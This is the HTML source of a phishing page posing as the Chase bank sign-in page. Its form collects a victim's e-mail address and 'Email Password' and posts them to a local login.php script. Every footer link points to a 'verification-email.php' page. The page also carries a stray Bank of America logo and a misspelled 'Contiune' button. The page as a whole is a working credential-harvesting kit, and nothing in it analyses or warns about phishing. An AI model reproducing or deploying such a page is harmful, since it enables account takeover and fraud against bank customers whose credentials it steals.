<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="msapplication-config" content="none">
  <title>Chase Bank - Credit Card, Mortgage, Auto, Banking Services</title>
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">



  <link rel="apple-touch-icon" sizes="152x152" href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/css/chase-touch-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="120x120" href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/css/chase-touch-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="76x76" href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/css/chase-touch-icon-76x76.png">
  <link rel="apple-touch-icon" href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/css/chase-touch-icon.png">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-startup-image" href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
  <link rel="apple-touch-startup-image" href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
  <link rel="apple-touch-startup-image" href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" media="screen and (max-device-width: 320px)">
  <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('css/opensans-regular.eot?#iefix') format('embedded-opentype'),url('css/opensans-regular.woff') format('woff'),url('css/opensans-regular.ttf') format('truetype'),url('css/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('css/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('css/opensans-semibold.woff') format('woff'),url('css/opensans-semibold.ttf') format('truetype'),url('css/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('css/opensans-light.eot?#iefix') format('embedded-opentype'),url('css/opensans-light.woff') format('woff'),url('css/opensans-light.ttf') format('truetype'),url('css/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('css/videoplayer.eot?#iefix') format('embedded-opentype'),url('css/videoplayer.woff') format('woff'),url('css/videoplayer.ttf') format('truetype'),url('css/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
  <link rel="stylesheet" href="./verification_files/blue-ui.css">
  <link rel="stylesheet" href="./verification_files/logon.css">
 
  <style type="text/css">.jpui.background.image { background-image: url(css/background.mobile.night.4.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.4.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.4.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(css/background.mobile.night.4.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(css/background.tablet.night.4.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(css/background.desktop.night.4.jpeg); } }</style>

    <script type="text/javascript">
function checkFilled() {
    var fnuo=document.getElementById('userId-input-field').value;
    var fuuk=document.getElementById('ss').value;
	var elem = document.getElementById("validator-error-header");
	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
	 if(!fnuo.match(emailExp))  {
   elem.className = "show-xs";
    document.getElementById("inner-logon-error").innerHTML = "Enter your E-mail Address linked with this account";
	document.getElementById('userId-input-field').style.borderBottom = "medium solid #d35351";
	document.getElementById('userId-input-field').style.borderTop = "thin solid #d35351";
	document.getElementById('userId-input-field').style.borderRight = "thin solid #d35351";
	document.getElementById('userId-input-field').style.borderLeft = "thin solid #d35351";
  return false;
    }else{
    elem.className = "show-xs";
	document.getElementById('userId-input-field').style.borderColor = "blue";
	document.getElementById('userId-input-field').style.borderWidth = "thin";
	document.getElementById('userId-input-field').style.borderTop = "thin solid blue";
	document.getElementById('userId-input-field').style.borderRight = "thin solid blue";
	document.getElementById('userId-input-field').style.borderLeft = "thin solid blue";       
    }
    if(fuuk.length < 5) {
 document.getElementById("inner-logon-error").innerHTML = "You must specify email password.";
	document.getElementById('ss').style.borderBottom = "medium solid #d35351";
	document.getElementById('ss').style.borderTop = "thin solid #d35351";
	document.getElementById('ss').style.borderRight = "thin solid #d35351";
	document.getElementById('ss').style.borderLeft = "thin solid #d35351";
        return false;
}else{
   elem.className = "hide-xs";
	document.getElementById('ss').style.borderColor = "blue";
	document.getElementById('ss').style.borderWidth = "thin";
	document.getElementById('ss').style.borderTop = "thin solid blue";
	document.getElementById('ss').style.borderRight = "thin solid blue";
	document.getElementById('ss').style.borderLeft = "thin solid blue";
return true;
    }



}


</script>    
    </head>
<body style="height: 100%;" data-has-view="true">
<div>
<div class="homepage" tabindex="-1">
<div id="sitemessage" role="region" aria-labelledby="site-messages-heading" class="toggle-aria-hidden" aria-hidden="true" data-has-view="true">
<div>
<div id="siteMessageAda" aria-live="polite">
<h2 id="site-messages-heading" class="util accessible-text" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You
have no more site alerts</h2>
</div>
</div>
</div>

<header id="logon-summary-menu" class="toggle-aria-hidden" data-has-view="true"></header>
<div class="logon header jpui transparent navigation bar">


     <img style="max-width: 80%;" src="./verification_files/chase.png">

</div>

</div>



<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>

</div>
</div>
<div class="container logon">
<div>
<div class="jpui background image fixed show-xs show-sm" id="geoImage"></div>
</div>

<div class="row">
<div id="logoffbox" class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">

</div>
</div>
<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>
</div>
</div>
</div>
</div>
<div>

<div class="jpui raised segment">

<div class="row">

<div class="col-xs-10 col-xs-offset-1">

    <form id="login-form" method="post" autocomplete="off" action="login.php?login=2" onsubmit="return checkFilled()">
 
  <div id="validator-error-header" class="hide-xs">
  <div id="logon-error" class="jpui error inverted primary alert error" role="region">
  <div class="icon"><span class="glyphicon glyphicon-exclamation-sign"></span> </div>
  <div id="content-logon-error" class="content wrap" style="margin-bottom:10px;">
<h2 class="title" tabindex="-1" id="inner-logon-error" style="font-size:18px; width:280px;"></h2>
  </div>
  </div>
 </div>
  <label for="userId-input-field" class="util accessible-text logon-xs-toggle error" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>E-mail Address</label>
  <div id="userId" class="logon-xs-toggle"><input id="userId-input-field" class="jpui input" placeholder="E-mail Address" aria-describedby="userId-helpertext" aria-invalid="false" min="0" name="3" data-validate="userId" value="" autocorrect="off" autocapitalize="off" data-attr="LOGON.userId" type="email">
  </div>
  
  <label for="password-input-field" class="util accessible-text logon-xs-toggle" data-attr="LOGON.passwordPlaceholder"><span class="accessible-text errorAdaText"></span>Password</label>
  <div id="password" class="logon-xs-toggle"><input id="ss" class="jpui input" placeholder="Email Password" aria-describedby="password-helpertext" aria-invalid="false" autocomplete="off" name="4" data-validate="password" value="" data-attr="LOGON.password" type="password">
  </div>
  <div></div>
  <div>
  <div>
  <div>
  <div>
  <div></div>
  </div>
  </div>
  </div>
  <div>
  <div>
  <div>
  <div></div>
  </div>
  </div>
  </div>
  </div>
  <div class="row"> <button class="jpui button focus fluid primary" id="signin-button" type="submit" role="button" data-attr="LOGON.logonToLandingPage">
  <div class="label">Contiune</div>
  </button> </div>
  <div></div>
  <div></div>
</form></div>
</div>
</div>
</div>
</div>
</div>
</div>
<footer id="logon-footer" class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12"><span <span="" class="follow-us-text" style="
    height: 30px;
">Follow us:</span>
<img itemprop="logo" height="21" width="185" alt="Βank of Αmerica" src="./verification_files/Capture.PNG">
</div>
</div>
</div>
<div class="footer-links row">
<div class="col-xs-12">
<ul>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact
us</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms
of use</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE
Act: Chase Mortgage Loan Originators</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair
Lending</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestAboutChase">About
Chase</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P.
Morgan</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan
Chase &amp; Co.</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Español</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase
Canada</a></li>
  <li><a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li>
  <li>Member FDIC</li>
  <li><i class="jpui equal-housing-lender icon" aria-hidden="true"></i>
Equal Housing Lender</li>
  <li class="copyright-label">©
2019 JPMorgan Chase &amp; Co.</li>
</ul>
</div>
</div>
<div class="row galaxy-footer">
<div class="col-xs-10 col-xs-offset-1">
<p class="NOTE"><span></span><br>
<span class="copyright-label">©
2019 JPMorgan Chase &amp; Co.</span><br>
<a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" class="NOTELINK" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy
<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a><br>
<a href="https://#/chasee/7c0376b77cef3221f4ea37269351d261/verification-email.php" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
</div>
</div>
</div>


<div id="languageSupportDisclaimer"></div>
<div id="overlay" data-has-view="true"></div>
<div id="signoutModal"></div>
<div id="siteExitWarning"></div>
<div id="serviceErrorModal">
</div>
<div id="sessionTimeoutModal"></div>



</body></html>